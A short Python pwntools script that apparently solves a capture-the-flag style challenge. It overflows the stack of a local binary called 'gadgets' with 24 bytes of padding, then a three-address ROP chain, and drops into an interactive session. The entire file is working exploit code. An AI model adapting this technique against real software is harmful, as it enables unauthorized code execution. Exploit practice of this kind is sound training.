from pwn import *
import struct

p  = process("./gadgets")
#p = gdb.debug("./gadgets",'b main')
p.recvuntil("seconds.")

payload = "A"*24

payload+=p64(0x00000000004006c3)
payload+=p64(0x40072a)
payload+=p64(0x00000000004005f6)

p.sendline(payload)

p.interactive()